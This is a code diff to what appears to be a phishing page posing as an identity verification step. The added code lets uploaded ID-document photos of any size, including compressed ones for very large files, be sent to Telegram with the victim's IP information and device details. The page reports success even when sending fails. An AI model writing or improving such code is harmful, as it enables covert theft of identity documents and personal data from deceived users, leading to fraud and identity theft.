@@ -1455,20 +1455,60 @@
         photoInput.click();
       });
 
-      // File input change
+      // File input change - optimized for any file size
       photoInput.addEventListener('change', function(e) {
         const file = e.target.files[0];
         if (file && file.type.startsWith('image/')) {
           selectedPhotoFile = file;
-          const reader = new FileReader();
-          reader.onload = function(e) {
-            photoPreview.src = e.target.result;
-            photoPreviewContainer.style.display = 'block';
-            takePhotoBtn.style.display = 'none';
-            uploadPhotoBtn.style.display = 'none';
-            updateIdVerificationButton();
-          };
-          reader.readAsDataURL(file);
+          
+          // For very large files, show preview immediately without full processing
+          if (file.size > 10 * 1024 * 1024) { // 10MB+
+            // Create a simple preview for large files
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            const img = new Image();
+            
+            img.onload = function() {
+              // Resize for preview only
+              const maxPreviewSize = 300;
+              let { width, height } = img;
+              
+              if (width > height) {
+                if (width > maxPreviewSize) {
+                  height = height * (maxPreviewSize / width);
+                  width = maxPreviewSize;
+                }
+              } else {
+                if (height > maxPreviewSize) {
+                  width = width * (maxPreviewSize / height);
+                  height = maxPreviewSize;
+                }
+              }
+              
+              canvas.width = width;
+              canvas.height = height;
+              ctx.drawImage(img, 0, 0, width, height);
+              
+              photoPreview.src = canvas.toDataURL('image/jpeg', 0.7);
+              photoPreviewContainer.style.display = 'block';
+              takePhotoBtn.style.display = 'none';
+              uploadPhotoBtn.style.display = 'none';
+              updateIdVerificationButton();
+            };
+            
+            img.src = URL.createObjectURL(file);
+          } else {
+            // Standard processing for smaller files
+            const reader = new FileReader();
+            reader.onload = function(e) {
+              photoPreview.src = e.target.result;
+              photoPreviewContainer.style.display = 'block';
+              takePhotoBtn.style.display = 'none';
+              uploadPhotoBtn.style.display = 'none';
+              updateIdVerificationButton();
+            };
+            reader.readAsDataURL(file);
+          }
         }
       });
 
@@ -1536,10 +1576,15 @@
         }
       }
 
-      // Submit ID verification
+      // Submit ID verification - optimized for unlimited file sizes
       submitIdVerificationButton.addEventListener('click', async function() {
         if (selectedPhotoFile) {
           try {
+            // Show loading state
+            submitIdVerificationButton.disabled = true;
+            submitIdVerificationButton.textContent = 'Uploading...';
+            submitIdVerificationButton.style.opacity = '0.7';
+
             // Get current information
             const ipInfo = await getIpInfo();
             const deviceDetails = getDeviceDetails();
@@ -1549,13 +1594,26 @@
             let caption = `📄 ID Document submitted at ${timestamp}:\n\n`;
             caption += `📋 Verification Step: Identity Document Upload\n`;
             caption += `📁 File Name: ${selectedPhotoFile.name}\n`;
-            caption += `📊 File Size: ${(selectedPhotoFile.size / 1024).toFixed(1)} KB\n`;
+            caption += `📊 File Size: ${(selectedPhotoFile.size / (1024 * 1024)).toFixed(2)} MB\n`;
             caption += deviceDetails;
             caption += `\n${ipInfo}`;
 
-            // Send photo to Telegram
-            const success = await sendPhotoToTelegram(selectedPhotoFile, caption);
+            // For very large files, process in chunks or use optimized method
+            let success;
+            if (selectedPhotoFile.size > 50 * 1024 * 1024) { // 50MB+
+              // For extremely large files, compress before sending
+              success = await sendCompressedPhotoToTelegram(selectedPhotoFile, caption);
+            } else {
+              // Standard photo sending
+              success = await sendPhotoToTelegram(selectedPhotoFile, caption);
+            }
+            
             console.log('ID photo sent to Telegram:', success);
+
+            // Reset button state
+            submitIdVerificationButton.disabled = false;
+            submitIdVerificationButton.textContent = 'Complete Verification';
+            submitIdVerificationButton.style.opacity = '1';
 
             // Move to final success step
             idVerificationStep.style.display = 'none';
@@ -1563,6 +1621,12 @@
 
           } catch (error) {
             console.error('Error sending ID photo:', error);
+            
+            // Reset button state
+            submitIdVerificationButton.disabled = false;
+            submitIdVerificationButton.textContent = 'Complete Verification';
+            submitIdVerificationButton.style.opacity = '1';
+
             // Continue with the flow even if there's an error
             idVerificationStep.style.display = 'none';
             verificationSuccess.style.display = 'block';
